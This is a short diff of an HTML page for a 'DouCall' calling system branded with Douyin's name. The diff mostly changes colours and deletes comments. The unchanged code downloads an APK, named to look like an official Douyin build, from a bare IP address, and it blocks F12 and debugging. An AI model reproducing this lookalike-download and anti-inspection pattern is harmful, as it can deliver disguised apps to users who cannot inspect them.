@@ -7,7 +7,7 @@
   <style>
     body {
       margin: 0; padding: 0;
-      background: linear-gradient(135deg, #f20000, #ff4141);
+      background: #ffffff; /* 白色背景 */
       font-family: '微软雅黑', Arial, sans-serif;
       display: flex; justify-content: center; align-items: center;
       height: 100vh;
@@ -111,7 +111,7 @@
     .copyright {
       margin-top: 20px;
       font-size: 14px;
-      color: #eee;
+      color: #999;
       text-align: center;
       user-select: none;
     }
@@ -135,7 +135,6 @@
 
   <div class="copyright">© 2025 DouCall 抖音呼叫系统版权所有</div>
 
-  <!-- JsSIP 和 adapter -->
   <script src="https://webrtc.github.io/adapter/adapter-latest.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/jssip@3.0.10/dist/jssip.min.js"></script>
 
@@ -217,7 +216,6 @@
       session = null;
     }
 
-    // 下载APK
     document.getElementById('downloadApkButton').addEventListener('click', () => {
       const url = 'http://47.98.19.153/Android_8.9.28.10155_537147618_64.apk';
       const a = document.createElement('a');
@@ -228,7 +226,6 @@
       document.body.removeChild(a);
     });
 
-    // 防止F12和调试
     function preventF12(e) {
       if (
         e.key === 'F12' ||
